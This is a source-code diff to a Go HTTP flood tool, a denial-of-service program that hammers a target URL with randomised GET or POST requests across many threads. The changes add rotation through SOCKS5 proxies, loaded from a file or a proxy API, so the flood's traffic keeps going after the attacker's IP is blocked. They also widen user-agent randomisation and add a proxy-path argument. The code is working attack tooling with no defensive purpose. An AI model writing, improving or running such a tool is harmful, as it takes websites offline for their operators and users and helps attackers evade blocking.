@@ -79,6 +79,7 @@ var (
 		"https://www.ted.com/search?q=",
 		"https://play.google.com/store/search?q=",
 	}
+	proxyUrls = make([]string, 0)
 )
 
 func init() {
@@ -103,7 +104,7 @@ func getuseragent() string {
 	} else if browser == "ie" {
 		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
 		engine := strconv.Itoa(rand.Intn(99)) + ".0"
-		option := rand.Intn(1)
+		option := rand.Intn(2)
 		var token string
 		if option == 1 {
 			token = choice6[rand.Intn(len(choice6)-1)] + "; "
@@ -183,18 +184,42 @@ func flood() {
 		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
 		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
 	}
-	var s net.Conn
+	var s, conn net.Conn
 	var err error
 	<-start //received signal
 	for {
+		if len(proxyUrls) > 0 {
+			proxyUrl := proxyUrls[rand.Intn(len(proxyUrls))]
+			dialer, err := tcpProxySocket{}.connProxy(strings.Trim(proxyUrl, "\r"))
+			if err != nil {
+				fmt.Printf("url2.Parse failed: %v\n", err)
+				continue
+			}
+			conn, err = dialer.Dial("tcp", addr)
+			if err != nil {
+				fmt.Printf("url2.Parse failed: %v\n", err)
+				continue
+			}
+			fmt.Println("proxy success url: ", proxyUrl)
+		}
 		if port == "443" {
 			cfg := &tls.Config{
 				InsecureSkipVerify: true,
 				ServerName:         host, //simple fix
 			}
-			s, err = tls.Dial("tcp", addr, cfg)
+			if len(proxyUrls) > 0 {
+				s = tls.Client(conn, cfg)
+			} else {
+				s, err = tls.Dial("tcp", addr, cfg)
+			}
+
 		} else {
-			s, err = net.Dial("tcp", addr)
+			if len(proxyUrls) > 0 {
+				s = conn
+			} else {
+				s, err = net.Dial("tcp", addr)
+			}
+
 		}
 		if err != nil {
 			fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
@@ -206,9 +231,10 @@ func flood() {
 					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
 				}
 				request += header + "\r\n"
-				s.Write([]byte(request))
+
+				_, _ = s.Write([]byte(request))
 			}
-			s.Close()
+			_ = s.Close()
 		}
 		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
 	}
@@ -224,10 +250,10 @@ func main() {
 	fmt.Println("                         .||                     Golang version 2.0      ")
 	fmt.Println("                                                        C0d3d By L330n123")
 	fmt.Println("==========================================================================")
-	if len(os.Args) != 6 {
+	if len(os.Args) != 7 {
 		fmt.Println("Post Mode will use header.txt as data")
 		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
-		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
+		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil> <proxyPath>")
 		os.Exit(1)
 	}
 	u, err := url.Parse(os.Args[1])
@@ -257,6 +283,36 @@ func main() {
 	limit, err := strconv.Atoi(os.Args[4])
 	if err != nil {
 		fmt.Println("limit should be a integer")
+	}
+	proxyPath := os.Args[6]
+	var proxy Socks5Lister
+	switch {
+	case strings.Contains(proxyPath, ".txt"):
+		proxy = FileSocks5List{Path: proxyPath}
+		proxyUrls, err = proxy.List()
+		if err != nil {
+			fmt.Println("Error:", err)
+		}
+	case proxyPath == "uu-api":
+		proxy = ApiSocks5List{
+			ApiServerAddress: "http://xxxxxxxx.com/api/",
+			Id:               "xxxxxxxx",
+			Size:             50,
+			Schemes:          "socks5",
+			SupportHTTPS:     "false",
+			RestimeWithinMs:  5000,
+			Format:           "txt2_1",
+		}
+		for i := 0; i < 50; i++ {
+			proxyUrl, err := proxy.List()
+			if err != nil {
+				fmt.Println("Error:", err)
+				break
+			}
+			time.Sleep(time.Second)
+			fmt.Println("================================================================\nProxy URL:", proxyUrl)
+			proxyUrls = append(proxyUrls, proxyUrl...)
+		}
 	}
 	if contain(page, "?") == 0 {
 		key = "?"
